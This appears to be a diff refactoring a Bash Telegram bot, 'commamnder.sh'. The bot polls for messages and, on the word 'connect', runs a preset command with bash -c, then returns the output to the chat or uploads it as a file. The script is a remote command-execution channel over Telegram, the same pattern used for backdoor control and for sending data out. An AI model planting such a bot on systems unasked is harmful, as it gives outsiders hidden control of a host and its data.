@@ -1,6 +1,5 @@
 #!/usr/bin/env bash
 # commamnder.sh — Pure Bash Telegram bot (no Node.js, no jq)
-# Usage: ./commamnder.sh
 # Requires: curl only
 
 set -euo pipefail
@@ -27,12 +26,14 @@ send_file() {
     -F document=@"$file" >/dev/null
 }
 
-# minimal parser: extracts update_id, chat_id, and text from Telegram JSON
+# parser: extracts update_id, chat_id, and text
 parse_updates_bash() {
-  echo "$1" | grep -oE '{[^}]*}' | while read -r obj; do
-    UPDATE_ID=$(echo "$obj" | grep -oE '"update_id":[0-9]+' | cut -d: -f2)
-    CHAT=$(echo "$obj" | grep -oE '"chat":\{"id":[0-9]+' | grep -oE '[0-9]+$' || true)
-    TEXT=$(echo "$obj" | grep -oE '"text":"[^"]*"' | sed 's/.*"text":"\([^"]*\)".*/\1/' || true)
+  local json="$1"
+  echo "$json" | grep -oE '{[^}]*}' | while read -r obj; do
+    local UPDATE_ID CHAT TEXT
+    UPDATE_ID=$(echo "$obj" | grep -Po '"update_id":\K[0-9]+' || true)
+    CHAT=$(echo "$obj" | grep -Po '"chat":\{"id":\K-?[0-9]+' || true)
+    TEXT=$(echo "$obj" | grep -Po '"text":"\K([^"]*)' | sed 's/\\n/ /g' || true)
 
     if [ -n "$UPDATE_ID" ] && [ -n "$CHAT" ]; then
       echo "${UPDATE_ID}|${CHAT}|${TEXT}"
@@ -41,7 +42,7 @@ parse_updates_bash() {
 }
 
 # notify on startup
-send_msg "ready to execute command"
+send_msg "✅ Bot is online and ready."
 
 OFFSET=0
 while true; do
@@ -58,22 +59,27 @@ while true; do
       continue
     fi
 
-    if [ "$TEXT" = "connect" ]; then
-      OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"
+    case "$TEXT" in
+      connect)
+        OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"
 
-      if [ -z "$OUTPUT" ]; then
-        send_msg "command executed successfully (no output)"
-      else
-        if [ ${#OUTPUT} -le 3500 ]; then
-          send_msg "command executed successfully:\n$OUTPUT"
+        if [ -z "$OUTPUT" ]; then
+          send_msg "✅ Command executed successfully (no output)."
         else
-          TMP="$(mktemp /tmp/out.XXXXXX)"
-          printf "%s\n" "$OUTPUT" > "$TMP"
-          send_file "$TMP"
-          rm -f "$TMP"
+          if [ ${#OUTPUT} -le 3500 ]; then
+            send_msg "✅ Command output:\n$OUTPUT"
+          else
+            TMP="$(mktemp /tmp/out.XXXXXX)"
+            printf "%s\n" "$OUTPUT" > "$TMP"
+            send_file "$TMP"
+            rm -f "$TMP"
+          fi
         fi
-      fi
-    fi
+        ;;
+      *)
+        # ignore unknown text
+        ;;
+    esac
   done < <(parse_updates_bash "$UPDATES")
 done
 
